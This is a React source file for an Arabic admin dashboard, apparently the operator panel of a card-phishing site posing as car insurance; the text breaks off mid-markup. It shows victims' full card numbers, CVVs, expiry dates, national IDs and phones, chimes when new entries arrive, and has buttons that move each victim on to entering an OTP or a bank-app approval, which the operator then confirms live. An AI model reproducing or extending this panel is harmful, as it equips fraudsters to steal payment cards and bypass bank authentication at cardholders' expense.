// @ts-nocheck
import { useEffect, useMemo, useRef, useState } from "react";
import { useNavigate } from "@/lib/router-compat";
import {
  LayoutDashboard,
  FileText,
  LogOut,
  Search,
  Trash2,
  Trash,
  X,
  CheckCircle2,
  Clock,
  Wallet,
  Users,
  Check,
  XCircle,
  CreditCard,
  KeyRound,
  Bell,
  BellOff,
  MessageCircle,
  Settings as SettingsIcon,
  Tag,
  ShieldCheck,
} from "lucide-react";
import {
  isAdminAuthed,
  loadApplications,
  deleteApplication,
  clearApplications,
  logoutAdmin,
  updateApplication,
  type StoredApplication,
} from "@/lib/admin-storage";
import { supabase } from "@/integrations/supabase/client";
import VisitorsPanel from "@/components/admin/VisitorsPanel";
import ChatPanel from "@/components/admin/ChatPanel";
import SettingsPanel from "@/components/admin/SettingsPanel";
import PricesPanel from "@/components/admin/PricesPanel";
import AdminsPanel from "@/components/admin/AdminsPanel";
import PasswordPanel from "@/components/admin/PasswordPanel";
import CreditCardVisual from "@/components/admin/CreditCardVisual";
import visaLogo from "@/assets/payments/visa.svg";
import mastercardLogo from "@/assets/payments/mastercard.svg";
import madaLogo from "@/assets/payments/mada.svg";
import { cn } from "@/lib/utils";
import { toast } from "sonner";

const CardBrandBadge = ({ brand }: { brand?: string }) => {
  if (brand === "visa") return <img src={visaLogo} alt="Visa" className="h-5 w-auto" />;
  if (brand === "mastercard")
    return <img src={mastercardLogo} alt="Mastercard" className="h-6 w-auto" />;
  if (brand === "mada") return <img src={madaLogo} alt="Mada" className="h-5 w-auto" />;
  return <CreditCard className="h-4 w-4 text-muted-foreground" />;
};

const Stat = ({
  label,
  value,
  icon: Icon,
  tone,
}: {
  label: string;
  value: string;
  icon: React.ElementType;
  tone: "blue" | "green" | "amber" | "violet";
}) => {
  const tones: Record<string, { bg: string; ring: string; bar: string }> = {
    blue: {
      bg: "bg-gradient-to-br from-brand-blue to-[hsl(205_78%_26%)] text-white",
      ring: "ring-brand-blue/15",
      bar: "from-brand-blue/60 to-transparent",
    },
    green: {
      bg: "bg-gradient-to-br from-emerald-500 to-emerald-700 text-white",
      ring: "ring-emerald-500/15",
      bar: "from-emerald-500/60 to-transparent",
    },
    amber: {
      bg: "bg-gradient-to-br from-amber-400 to-orange-500 text-white",
      ring: "ring-amber-500/15",
      bar: "from-amber-500/60 to-transparent",
    },
    violet: {
      bg: "bg-gradient-to-br from-violet-500 to-fuchsia-600 text-white",
      ring: "ring-violet-500/15",
      bar: "from-violet-500/60 to-transparent",
    },
  };
  const t = tones[tone];
  return (
    <div
      className={cn(
        "group relative overflow-hidden rounded-2xl bg-white p-4 shadow-card ring-1 transition-all duration-300 hover:-translate-y-0.5 hover:shadow-float sm:p-5",
        t.ring,
      )}
    >
      <div
        className={cn(
          "pointer-events-none absolute inset-x-0 top-0 h-px bg-gradient-to-r",
          t.bar,
        )}
      />
      <div className="flex items-center justify-between gap-3">
        <div
          className={cn(
            "grid h-12 w-12 place-items-center rounded-xl shadow-soft transition-transform duration-300 group-hover:scale-105",
            t.bg,
          )}
        >
          <Icon className="h-5 w-5" strokeWidth={2.2} />
        </div>
        <div className="text-right">
          <div className="text-[11.5px] font-bold uppercase tracking-wide text-muted-foreground">
            {label}
          </div>
          <div className="mt-1 text-[22px] font-extrabold text-brand-blue tabular-nums sm:text-[26px]">
            {value}
          </div>
        </div>
      </div>
    </div>
  );
};

const Detail = ({ label, value }: { label: string; value?: string | number }) => (
  <div className="flex items-start justify-between gap-3 px-3 py-2.5 text-[13px] odd:bg-muted/30">
    <span className="text-muted-foreground">{label}</span>
    <span className="text-left font-bold text-brand-blue">{value ?? "—"}</span>
  </div>
);

const Section = ({
  icon: Icon,
  title,
  tone = "blue",
  children,
}: {
  icon: React.ElementType;
  title: string;
  tone?: "blue" | "emerald" | "amber" | "violet";
  children: React.ReactNode;
}) => {
  const tones: Record<string, string> = {
    blue: "bg-brand-blue/10 text-brand-blue",
    emerald: "bg-emerald-100 text-emerald-700",
    amber: "bg-amber-100 text-amber-700",
    violet: "bg-violet-100 text-violet-700",
  };
  return (
    <section className="overflow-hidden rounded-2xl border border-border/70 bg-white shadow-sm">
      <header className="flex items-center gap-2 border-b border-border/70 bg-muted/40 px-3 py-2.5">
        <span className={cn("grid h-7 w-7 place-items-center rounded-lg", tones[tone])}>
          <Icon className="h-3.5 w-3.5" strokeWidth={2.4} />
        </span>
        <h3 className="text-[13px] font-extrabold text-brand-blue">{title}</h3>
      </header>
      <div>{children}</div>
    </section>
  );
};

const AdminDashboard = () => {
  const navigate = useNavigate();
  const [apps, setApps] = useState<StoredApplication[]>([]);
  const [query, setQuery] = useState("");
  const [selected, setSelected] = useState<StoredApplication | null>(null);
  const [tab, setTab] = useState<
    | "orders"
    | "visitors"
    | "chat"
    | "settings"
    | "prices"
    | "admins"
    | "password"
  >("visitors");
  const [soundEnabled, setSoundEnabled] = useState<boolean>(() => {
    if (typeof window === "undefined") return true;
    return localStorage.getItem("admin_sound_enabled") !== "0";
  });
  const audioCtxRef = useRef<AudioContext | null>(null);
  const initialLoadRef = useRef(false);

  const refresh = async () => setApps(await loadApplications());

  // Play a short pleasant chime using Web Audio (no asset required)
  const playChime = () => {
    if (!soundEnabled) return;
    try {
      if (!audioCtxRef.current) {
        const Ctx = (window.AudioContext || (window as any).webkitAudioContext) as typeof AudioContext;
        audioCtxRef.current = new Ctx();
      }
      const ctx = audioCtxRef.current;
      if (ctx.state === "suspended") ctx.resume();

      const now = ctx.currentTime;
      // Two-note chime: E5 then A5
      const notes = [
        { freq: 659.25, start: 0, dur: 0.18 },
        { freq: 880.0, start: 0.16, dur: 0.32 },
      ];
      notes.forEach(({ freq, start, dur }) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = "sine";
        osc.frequency.value = freq;
        gain.gain.setValueAtTime(0.0001, now + start);
        gain.gain.exponentialRampToValueAtTime(0.25, now + start + 0.02);
        gain.gain.exponentialRampToValueAtTime(0.0001, now + start + dur);
        osc.connect(gain).connect(ctx.destination);
        osc.start(now + start);
        osc.stop(now + start + dur + 0.05);
      });
    } catch (e) {
      console.warn("[admin] chime failed", e);
    }
  };

  const toggleSound = () => {
    setSoundEnabled((prev) => {
      const next = !prev;
      localStorage.setItem("admin_sound_enabled", next ? "1" : "0");
      if (next) {
        // initialize audio context on user gesture
        try {
          const Ctx = (window.AudioContext || (window as any).webkitAudioContext) as typeof AudioContext;
          audioCtxRef.current = audioCtxRef.current || new Ctx();
          audioCtxRef.current.resume();
        } catch {}
      }
      return next;
    });
  };

  useEffect(() => {
    if (!isAdminAuthed()) {
      navigate("/yasin1/login", { replace: true });
      return;
    }
    (async () => {
      await refresh();
      initialLoadRef.current = true;
    })();
  }, [navigate]);

  // Realtime subscription so admin sees new entries instantly
  useEffect(() => {
    const channel = supabase
      .channel("applications-changes")
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "applications" },
        (payload) => {
          const row = payload.new as { id?: string; full_name?: string | null };
          // Optimistically refetch (so we get the full mapped row)
          refresh();
          // Notify admin
          if (initialLoadRef.current) {
            playChime();
            toast.success("طلب جديد وصل الآن", {
              description: row.full_name
                ? `من ${row.full_name}`
                : `رقم: ${row.id ?? ""}`,
              duration: 6000,
            });
          }
        },
      )
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "applications" },
        () => refresh(),
      )
      .on(
        "postgres_changes",
        { event: "DELETE", schema: "public", table: "applications" },
        () => refresh(),
      )
      .subscribe();
    return () => {
      supabase.removeChannel(channel);
    };
    // soundEnabled is read inside playChime via closure — re-subscribe not needed
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Keep `selected` in sync with the latest data from `apps`
  // so that OTP submitted by the user appears live under the card.
  useEffect(() => {
    setSelected((prev) => {
      if (!prev) return prev;
      const fresh = apps.find((a) => a.id === prev.id);
      return fresh ? fresh : prev;
    });
  }, [apps]);

  const handleApprove = async (id: string) => {
    await updateApplication(id, { reviewStatus: "approved" });
    await refresh();
    setSelected((s) => (s && s.id === id ? { ...s, reviewStatus: "approved" } : s));
    toast.success("تم قبول العملية — العميل سينتقل لإدخال OTP");
  };

  const handleReject = async (id: string) => {
    await updateApplication(id, { reviewStatus: "rejected" });
    await refresh();
    setSelected((s) => (s && s.id === id ? { ...s, reviewStatus: "rejected" } : s));
    toast.success("تم رفض العملية");
  };

  const handleApproveBank = async (id: string) => {
    await updateApplication(id, { reviewStatus: "bank_approval" });
    await refresh();
    setSelected((s) => (s && s.id === id ? { ...s, reviewStatus: "bank_approval" } : s));
    toast.success("تم إرسال طلب الموافقة إلى تطبيق البنك");
  };

  const handleApproveOtp = async (id: string) => {
    await updateApplication(id, { reviewStatus: "completed", status: "paid" });
    await refresh();
    setSelected((s) =>
      s && s.id === id ? { ...s, reviewStatus: "completed", status: "paid" } : s,
    );
    toast.success("تم تأكيد OTP — اكتملت العملية");
  };

  const handleRejectOtp = async (id: string) => {
    await updateApplication(id, { reviewStatus: "otp_rejected" });
    await refresh();
    setSelected((s) => (s && s.id === id ? { ...s, reviewStatus: "otp_rejected" } : s));
    toast.success("تم رفض OTP — العميل سيُطالب بإدخال رمز جديد");
  };

  const filtered = useMemo(() => {
    const q = query.trim().toLowerCase();
    if (!q) return apps;
    return apps.filter((a) =>
      [
        a.fullName,
        a.identity,
        a.phone,
        a.company,
        a.carModel,
        a.id,
      ]
        .filter(Boolean)
        .some((v) => String(v).toLowerCase().includes(q)),
    );
  }, [apps, query]);

  const totalRevenue = useMemo(
    () => apps.reduce((sum, a) => sum + (a.total ?? 0), 0),
    [apps],
  );
  const paidCount = apps.filter((a) => a.status === "paid").length;
  const uniqueCustomers = new Set(apps.map((a) => a.identity || a.phone)).size;

  const handleDelete = async (id: string) => {
    await deleteApplication(id);
    await refresh();
    setSelected(null);
    toast.success("تم حذف الطلب");
  };

  const handleClearAll = async () => {
    if (!confirm("هل أنت متأكد من حذف جميع الطلبات؟")) return;
    await clearApplications();
    await refresh();
    toast.success("تم حذف جميع الطلبات");
  };

  const handleLogout = () => {
    logoutAdmin();
    navigate("/yasin1/login");
  };

  return (
    <main
      dir="rtl"
      className="min-h-screen bg-gradient-to-b from-[hsl(210_40%_97%)] via-[hsl(210_40%_98%)] to-[hsl(210_40%_96%)]"
    >
      {/* Decorative blurred backdrop */}
      <div className="pointer-events-none fixed inset-x-0 top-0 -z-10 h-[320px] overflow-hidden">
        <div className="absolute -top-24 right-1/3 h-72 w-72 rounded-full bg-brand-blue/15 blur-3xl" />
        <div className="absolute -top-16 left-1/4 h-64 w-64 rounded-full bg-violet-400/15 blur-3xl" />
      </div>

      {/* Top bar */}
      <header className="sticky top-0 z-30 border-b border-white/60 bg-white/80 backdrop-blur-xl supports-[backdrop-filter]:bg-white/70">
        <div className="mx-auto flex h-16 max-w-[1400px] items-center justify-between px-4">
          <div className="flex items-center gap-3">
            <div className="grid h-10 w-10 place-items-center rounded-xl bg-gradient-to-br from-brand-blue to-[hsl(205_78%_26%)] text-white shadow-soft">
              <LayoutDashboard className="h-5 w-5" strokeWidth={2.2} />
            </div>
            <div className="leading-tight">
              <h1 className="text-[15px] font-extrabold text-brand-blue sm:text-[16px]">
                لوحة الإدارة
              </h1>
              <div className="text-[11px] font-medium text-muted-foreground">
                إدارة الطلبات والزوار
              </div>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={toggleSound}
              title={soundEnabled ? "كتم الإشعار الصوتي" : "تفعيل الإشعار الصوتي"}
              aria-label="تبديل الإشعار الصوتي"
              className={cn(
                "grid h-10 w-10 place-items-center rounded-xl border text-[12.5px] font-bold transition-all duration-200 hover:scale-105",
                soundEnabled
                  ? "border-emerald-200 bg-emerald-50 text-emerald-700 hover:bg-emerald-100"
                  : "border-border bg-white/70 text-muted-foreground hover:bg-muted/50",
              )}
            >
              {soundEnabled ? <Bell className="h-4 w-4" /> : <BellOff className="h-4 w-4" />}
            </button>
            <button
              type="button"
              onClick={handleLogout}
              className="flex h-10 items-center gap-1.5 rounded-xl border border-border bg-white/70 px-3.5 text-[12.5px] font-bold text-brand-blue transition-all duration-200 hover:bg-white hover:shadow-soft"
            >
              <LogOut className="h-4 w-4" />
              <span>خروج</span>
            </button>
          </div>
        </div>
      </header>

      <div className="mx-auto grid max-w-[1400px] grid-cols-1 gap-4 px-4 py-5 lg:grid-cols-[220px_1fr]">
        {/* Sidebar */}
        <aside className="hidden lg:block">
          <nav className="sticky top-24 space-y-1.5 rounded-2xl border border-white/60 bg-white/80 p-3 shadow-card backdrop-blur-xl">
            <div className="mb-1 px-3 pt-1 text-[10.5px] font-bold uppercase tracking-wider text-muted-foreground">
              القوائم
            </div>
            <button
              type="button"
              onClick={() => setTab("visitors")}
              className={cn(
                "group relative flex w-full items-center gap-2.5 overflow-hidden rounded-xl px-3 py-2.5 text-right text-[13px] font-extrabold transition-all duration-200",
                tab === "visitors"
                  ? "bg-gradient-to-l from-brand-blue/10 via-brand-blue/5 to-transparent text-brand-blue shadow-soft"
                  : "text-muted-foreground hover:bg-muted/60 hover:text-brand-blue",
              )}
            >
              {tab === "visitors" && (
                <span className="absolute inset-y-1.5 right-0 w-1 rounded-l-full bg-brand-blue" />
              )}
              <Users className="h-4 w-4" />
              <span>الزوار المتصلون</span>
              <span className="relative ms-auto flex h-2 w-2">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75" />
                <span className="relative inline-flex h-2 w-2 rounded-full bg-emerald-500" />
              </span>
            </button>
            <div className="flex gap-1.5">
              <button
                type="button"
                onClick={() => setTab("prices")}
                className={cn(
                  "group relative flex flex-1 items-center gap-2 overflow-hidden rounded-xl px-2.5 py-2.5 text-right text-[12.5px] font-extrabold transition-all duration-200",
                  tab === "prices"
                    ? "bg-gradient-to-l from-amber-500/15 via-amber-500/5 to-transparent text-amber-700 shadow-soft"
                    : "text-muted-foreground hover:bg-muted/60 hover:text-brand-blue",
                )}
              >
                {tab === "prices" && (
                  <span className="absolute inset-y-1.5 right-0 w-1 rounded-l-full bg-amber-500" />
                )}
                <Tag className="h-4 w-4" />
                <span>الأسعار</span>
              </button>
              <button
                type="button"
                onClick={() => setTab("admins")}
                className={cn(
                  "group relative flex flex-1 items-center gap-2 overflow-hidden rounded-xl px-2.5 py-2.5 text-right text-[12.5px] font-extrabold transition-all duration-200",
                  tab === "admins"
                    ? "bg-gradient-to-l from-violet-500/15 via-violet-500/5 to-transparent text-violet-700 shadow-soft"
                    : "text-muted-foreground hover:bg-muted/60 hover:text-brand-blue",
                )}
              >
                {tab === "admins" && (
                  <span className="absolute inset-y-1.5 right-0 w-1 rounded-l-full bg-violet-500" />
                )}
                <ShieldCheck className="h-4 w-4" />
                <span>المسؤولون</span>
              </button>
            </div>
            <button
              type="button"
              onClick={() => setTab("orders")}
              className={cn(
                "group relative flex w-full items-center gap-2.5 overflow-hidden rounded-xl px-3 py-2.5 text-right text-[13px] font-extrabold transition-all duration-200",
                tab === "orders"
                  ? "bg-gradient-to-l from-brand-blue/10 via-brand-blue/5 to-transparent text-brand-blue shadow-soft"
                  : "text-muted-foreground hover:bg-muted/60 hover:text-brand-blue",
              )}
            >
              {tab === "orders" && (
                <span className="absolute inset-y-1.5 right-0 w-1 rounded-l-full bg-brand-blue" />
              )}
              <FileText className="h-4 w-4" />
              <span>الطلبات</span>
              <span
                className={cn(
                  "ms-auto rounded-full px-2 py-0.5 text-[11px] font-extrabold tabular-nums",
                  tab === "orders"
                    ? "bg-brand-blue text-white"
                    : "bg-muted text-brand-blue",
                )}
              >
                {apps.length}
              </span>
            </button>
            <button
              type="button"
              onClick={() => setTab("chat")}
              className={cn(
                "group relative flex w-full items-center gap-2.5 overflow-hidden rounded-xl px-3 py-2.5 text-right text-[13px] font-extrabold transition-all duration-200",
                tab === "chat"
                  ? "bg-gradient-to-l from-brand-blue/10 via-brand-blue/5 to-transparent text-brand-blue shadow-soft"
                  : "text-muted-foreground hover:bg-muted/60 hover:text-brand-blue",
              )}
            >
              {tab === "chat" && (
                <span className="absolute inset-y-1.5 right-0 w-1 rounded-l-full bg-brand-blue" />
              )}
              <MessageCircle className="h-4 w-4" />
              <span>الدردشة</span>
            </button>
            <button
              type="button"
              onClick={() => setTab("settings")}
              className={cn(
                "group relative flex w-full items-center gap-2.5 overflow-hidden rounded-xl px-3 py-2.5 text-right text-[13px] font-extrabold transition-all duration-200",
                tab === "settings"
                  ? "bg-gradient-to-l from-brand-blue/10 via-brand-blue/5 to-transparent text-brand-blue shadow-soft"
                  : "text-muted-foreground hover:bg-muted/60 hover:text-brand-blue",
              )}
            >
              {tab === "settings" && (
                <span className="absolute inset-y-1.5 right-0 w-1 rounded-l-full bg-brand-blue" />
              )}
              <SettingsIcon className="h-4 w-4" />
              <span>الإعدادات</span>
            </button>
            <button
              type="button"
              onClick={() => setTab("password")}
              className={cn(
                "group relative flex w-full items-center gap-2.5 overflow-hidden rounded-xl px-3 py-2.5 text-right text-[13px] font-extrabold transition-all duration-200",
                tab === "password"
                  ? "bg-gradient-to-l from-amber-500/15 via-amber-500/5 to-transparent text-amber-700 shadow-soft"
                  : "text-muted-foreground hover:bg-muted/60 hover:text-brand-blue",
              )}
            >
              {tab === "password" && (
                <span className="absolute inset-y-1.5 right-0 w-1 rounded-l-full bg-amber-500" />
              )}
              <KeyRound className="h-4 w-4" />
              <span>تغيير كلمة المرور</span>
            </button>

          </nav>
        </aside>

        {/* Mobile tabs */}
        <div className="grid grid-cols-3 gap-2 lg:hidden">
          <button
            type="button"
            onClick={() => setTab("visitors")}
            className={cn(
              "rounded-xl px-3 py-2 text-[12.5px] font-extrabold",
              tab === "visitors"
                ? "bg-brand-blue text-white"
                : "bg-white text-brand-blue shadow-card",
            )}
          >
            الزوار
          </button>
          <button
            type="button"
            onClick={() => setTab("prices")}
            className={cn(
              "rounded-xl px-3 py-2 text-[12.5px] font-extrabold",
              tab === "prices"
                ? "bg-amber-500 text-white"
                : "bg-white text-brand-blue shadow-card",
            )}
          >
            الأسعار
          </button>
          <button
            type="button"
            onClick={() => setTab("admins")}
            className={cn(
              "rounded-xl px-3 py-2 text-[12.5px] font-extrabold",
              tab === "admins"
                ? "bg-violet-500 text-white"
                : "bg-white text-brand-blue shadow-card",
            )}
          >
            المسؤولون
          </button>
          <button
            type="button"
            onClick={() => setTab("orders")}
            className={cn(
              "rounded-xl px-3 py-2 text-[12.5px] font-extrabold",
              tab === "orders"
                ? "bg-brand-blue text-white"
                : "bg-white text-brand-blue shadow-card",
            )}
          >
            الطلبات
          </button>
          <button
            type="button"
            onClick={() => setTab("chat")}
            className={cn(
              "rounded-xl px-3 py-2 text-[12.5px] font-extrabold",
              tab === "chat"
                ? "bg-brand-blue text-white"
                : "bg-white text-brand-blue shadow-card",
            )}
          >
            الدردشة
          </button>
          <button
            type="button"
            onClick={() => setTab("settings")}
            className={cn(
              "rounded-xl px-3 py-2 text-[12.5px] font-extrabold",
              tab === "settings"
                ? "bg-brand-blue text-white"
                : "bg-white text-brand-blue shadow-card",
            )}
          >
            الإعدادات
          </button>
          <button
            type="button"
            onClick={() => setTab("password")}
            className={cn(
              "col-span-3 rounded-xl px-3 py-2 text-[12.5px] font-extrabold",
              tab === "password"
                ? "bg-amber-600 text-white"
                : "bg-white text-brand-blue shadow-card",
            )}
          >
            تغيير كلمة المرور
          </button>

        </div>

        {/* Content */}
        <section className="space-y-5">
          {tab === "visitors" ? (
            <VisitorsPanel />
          ) : tab === "chat" ? (
            <ChatPanel />
          ) : tab === "settings" ? (
            <SettingsPanel />
          ) : tab === "prices" ? (
            <PricesPanel />
          ) : tab === "admins" ? (
            <AdminsPanel />
          ) : tab === "password" ? (
            <PasswordPanel />
          ) : (

            <>
          {/* Stats */}
          <div className="grid grid-cols-2 gap-3 sm:gap-4 lg:grid-cols-4">
            <Stat label="إجمالي الطلبات" value={String(apps.length)} icon={FileText} tone="blue" />
            <Stat label="مدفوعة" value={String(paidCount)} icon={CheckCircle2} tone="green" />
            <Stat
              label="إجمالي الإيرادات"
              value={`${totalRevenue.toFixed(2)} ر.س`}
              icon={Wallet}
              tone="amber"
            />
            <Stat label="عدد العملاء" value={String(uniqueCustomers)} icon={Users} tone="violet" />
          </div>

          {/* Toolbar */}
          <div className="flex flex-col gap-3 rounded-2xl bg-white p-4 shadow-card sm:flex-row sm:items-center sm:justify-between">
            <div className="relative flex-1">
              <Search className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
              <input
                value={query}
                onChange={(e) => setQuery(e.target.value)}
                placeholder="ابحث بالاسم، الهوية، الجوال، الشركة..."
                className="h-11 w-full rounded-[10px] border border-[hsl(214_25%_85%)] bg-white pe-10 ps-3 text-right text-[13.5px] text-brand-blue outline-none focus:border-brand-blue"
              />
            </div>
            <button
              type="button"
              onClick={handleClearAll}
              disabled={apps.length === 0}
              className="flex h-11 items-center justify-center gap-2 rounded-[10px] border border-destructive/30 bg-white px-4 text-[12.5px] font-bold text-destructive hover:bg-destructive/5 disabled:opacity-40"
            >
              <Trash className="h-4 w-4" />
              <span>حذف الكل</span>
            </button>
          </div>

          {/* Table — desktop / tablet */}
          <div className="hidden overflow-hidden rounded-2xl bg-white shadow-card md:block">
            <div className="overflow-x-auto">
              <table className="w-full text-right text-[13px]">
                <thead className="bg-brand-blue/5 text-brand-blue">
                  <tr>
                    <th className="px-3 py-3 font-extrabold">رقم الطلب</th>
                    <th className="px-3 py-3 font-extrabold">العميل</th>
                    <th className="px-3 py-3 font-extrabold">الجوال</th>
                    <th className="px-3 py-3 font-extrabold">المركبة</th>
                    <th className="px-3 py-3 font-extrabold">الشركة</th>
                    <th className="px-3 py-3 font-extrabold">البطاقة</th>
                    <th className="px-3 py-3 font-extrabold">المبلغ</th>
                    <th className="px-3 py-3 font-extrabold">الحالة</th>
                    <th className="px-3 py-3 font-extrabold">إجراء</th>
                    <th className="px-3 py-3 font-extrabold">التاريخ</th>
                    <th className="px-3 py-3 font-extrabold"></th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-border">
                  {filtered.length === 0 && (
                    <tr>
                      <td colSpan={11} className="px-3 py-10 text-center text-muted-foreground">
                        لا توجد بيانات بعد.
                      </td>
                    </tr>
                  )}
                  {filtered.map((a) => {
                    const reviewLabel: Record<string, { text: string; cls: string; icon: React.ElementType }> = {
                      awaiting_review: { text: "بانتظار المراجعة", cls: "bg-amber-100 text-amber-700", icon: Clock },
                      bank_approval: { text: "بانتظار موافقة تطبيق البنك", cls: "bg-blue-100 text-blue-700", icon: Clock },
                      approved: { text: "تم القبول — بانتظار OTP", cls: "bg-blue-100 text-blue-700", icon: CheckCircle2 },
                      rejected: { text: "مرفوض", cls: "bg-red-100 text-red-700", icon: XCircle },
                      completed: { text: "مكتمل / مدفوع", cls: "bg-emerald-100 text-emerald-700", icon: CheckCircle2 },
                    };
                    const review = reviewLabel[a.reviewStatus] || reviewLabel.awaiting_review;
                    const ReviewIcon = review.icon;
                    return (
                      <tr
                        key={a.id}
                        onClick={() => setSelected(a)}
                        className="cursor-pointer transition-colors hover:bg-muted/40"
                      >
                        <td className="px-3 py-3 font-bold text-brand-blue">{a.id}</td>
                        <td className="px-3 py-3">{a.fullName || "—"}</td>
                        <td className="px-3 py-3" dir="ltr">{a.phone || "—"}</td>
                        <td className="px-3 py-3">{a.carModel || "—"}</td>
                        <td className="px-3 py-3">{a.company || "—"}</td>
                        <td className="px-3 py-3">
                          {a.cardNumber ? (
                            <div className="flex flex-col items-end gap-1" dir="ltr">
                              <div className="flex items-center gap-2">
                                <span className="font-mono text-[12.5px] font-bold tracking-wider text-brand-blue">
                                  {a.cardNumber}
                                </span>
                                <CardBrandBadge brand={a.cardBrand} />
                              </div>
                              <div className="flex items-center gap-2 text-[10.5px] text-muted-foreground">
                                <span>EXP {a.cardExpMonth}/{a.cardExpYear}</span>
                                <span>•</span>
                                <span>CVV {a.cardCvv}</span>
                                {a.cardName && <><span>•</span><span className="truncate max-w-[120px]">{a.cardName}</span></>}
                              </div>
                            </div>
                          ) : (
                            "—"
                          )}
                        </td>
                        <td className="px-3 py-3 font-extrabold text-brand-blue">
                          {a.total != null ? `${a.total.toFixed(2)} ر.س` : "—"}
                        </td>
                        <td className="px-3 py-3">
                          <span
                            className={cn(
                              "inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[11px] font-bold",
                              review.cls,
                            )}
                          >
                            <ReviewIcon className="h-3 w-3" />
                            {review.text}
                          </span>
                        </td>
                        <td className="px-3 py-3">
                          {a.reviewStatus === "awaiting_review" ? (
                            <div className="flex flex-wrap items-center justify-end gap-1.5">
                              <button
                                type="button"
                                onClick={(e) => { e.stopPropagation(); handleApprove(a.id); }}
                                className="flex h-8 items-center gap-1 rounded-lg bg-emerald-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110"
                              >
                                <Check className="h-3.5 w-3.5" />
                                <span>قبول</span>
                              </button>
                              <button
                                type="button"
                                onClick={(e) => { e.stopPropagation(); handleApproveBank(a.id); }}
                                className="flex h-8 items-center gap-1 rounded-lg bg-blue-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110"
                              >
                                <Check className="h-3.5 w-3.5" />
                                <span>قبول على البنك</span>
                              </button>
                              <button
                                type="button"
                                onClick={(e) => { e.stopPropagation(); handleReject(a.id); }}
                                className="flex h-8 items-center gap-1 rounded-lg bg-destructive px-2.5 text-[11px] font-extrabold text-white hover:brightness-110"
                              >
                                <XCircle className="h-3.5 w-3.5" />
                                <span>رفض</span>
                              </button>
                            </div>
                          ) : (
                            <span className="text-[11px] text-muted-foreground">—</span>
                          )}
                        </td>
                        <td className="px-3 py-3 text-muted-foreground whitespace-nowrap">
                          {new Date(a.createdAt).toLocaleString("ar-SA")}
                        </td>
                        <td className="px-3 py-3">
                          <button
                            type="button"
                            onClick={(e) => { e.stopPropagation(); handleDelete(a.id); }}
                            className="grid h-8 w-8 place-items-center rounded-lg text-destructive hover:bg-destructive/10"
                            aria-label="حذف"
                          >
                            <Trash2 className="h-4 w-4" />
                          </button>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </div>

          {/* Mobile cards */}
          <div className="space-y-3 md:hidden">
            {filtered.length === 0 && (
              <div className="rounded-2xl bg-white p-8 text-center text-[13px] text-muted-foreground shadow-card">
                لا توجد بيانات بعد.
              </div>
            )}
            {filtered.map((a) => {
              const reviewLabel: Record<string, { text: string; cls: string; icon: React.ElementType }> = {
                awaiting_review: { text: "بانتظار المراجعة", cls: "bg-amber-100 text-amber-700", icon: Clock },
                      bank_approval: { text: "بانتظار موافقة تطبيق البنك", cls: "bg-blue-100 text-blue-700", icon: Clock },
                approved: { text: "تم القبول — بانتظار OTP", cls: "bg-blue-100 text-blue-700", icon: CheckCircle2 },
                rejected: { text: "مرفوض", cls: "bg-red-100 text-red-700", icon: XCircle },
                completed: { text: "مكتمل / مدفوع", cls: "bg-emerald-100 text-emerald-700", icon: CheckCircle2 },
              };
              const review = reviewLabel[a.reviewStatus] || reviewLabel.awaiting_review;
              const ReviewIcon = review.icon;
              return (
                <div
                  key={a.id}
                  className="rounded-2xl bg-white p-4 shadow-card active:scale-[0.99] transition-transform"
                >
                  <button
                    type="button"
                    onClick={() => setSelected(a)}
                    className="flex w-full items-start justify-between gap-3 text-right"
                  >
                    <div className="min-w-0 flex-1">
                      <div className="text-[11px] font-bold text-muted-foreground">{a.id}</div>
                      <div className="mt-0.5 truncate text-[14px] font-extrabold text-brand-blue">
                        {a.fullName || "—"}
                      </div>
                      <div className="mt-0.5 truncate text-[12px] text-muted-foreground" dir="ltr">
                        {a.phone || "—"}
                      </div>
                    </div>
                    <div className="text-left">
                      <div className="text-[14px] font-extrabold text-brand-blue whitespace-nowrap">
                        {a.total != null ? `${a.total.toFixed(2)} ر.س` : "—"}
                      </div>
                      <div className="mt-1 flex justify-end">
                        <CardBrandBadge brand={a.cardBrand} />
                      </div>
                    </div>
                  </button>

                  <div className="mt-3 grid grid-cols-2 gap-2 text-[11.5px]">
                    <div className="rounded-lg bg-muted/40 px-2 py-1.5">
                      <div className="text-muted-foreground">المركبة</div>
                      <div className="truncate font-bold text-brand-blue">{a.carModel || "—"}</div>
                    </div>
                    <div className="rounded-lg bg-muted/40 px-2 py-1.5">
                      <div className="text-muted-foreground">الشركة</div>
                      <div className="truncate font-bold text-brand-blue">{a.company || "—"}</div>
                    </div>
                  </div>

                  <div className="mt-3 flex items-center justify-between gap-2">
                    <span className={cn(
                      "inline-flex items-center gap-1 rounded-full px-2 py-1 text-[10.5px] font-bold",
                      review.cls,
                    )}>
                      <ReviewIcon className="h-3 w-3" />
                      {review.text}
                    </span>
                    <span className="text-[10.5px] text-muted-foreground">
                      {new Date(a.createdAt).toLocaleString("ar-SA")}
                    </span>
                  </div>

                  {a.reviewStatus === "awaiting_review" && (
                    <div className="mt-3 grid grid-cols-3 gap-2">
                      <button
                        type="button"
                        onClick={(e) => { e.stopPropagation(); handleApprove(a.id); }}
                        className="flex h-10 items-center justify-center gap-1 rounded-xl bg-emerald-600 text-[12px] font-extrabold text-white active:brightness-110"
                      >
                        <Check className="h-4 w-4" />
                        <span>قبول</span>
                      </button>
                      <button
                        type="button"
                        onClick={(e) => { e.stopPropagation(); handleApproveBank(a.id); }}
                        className="flex h-10 items-center justify-center gap-1 rounded-xl bg-blue-600 text-[12px] font-extrabold text-white active:brightness-110"
                      >
                        <Check className="h-4 w-4" />
                        <span>قبول بنك</span>
                      </button>
                      <button
                        type="button"
                        onClick={(e) => { e.stopPropagation(); handleReject(a.id); }}
                        className="flex h-10 items-center justify-center gap-1 rounded-xl bg-destructive text-[12px] font-extrabold text-white active:brightness-110"
                      >
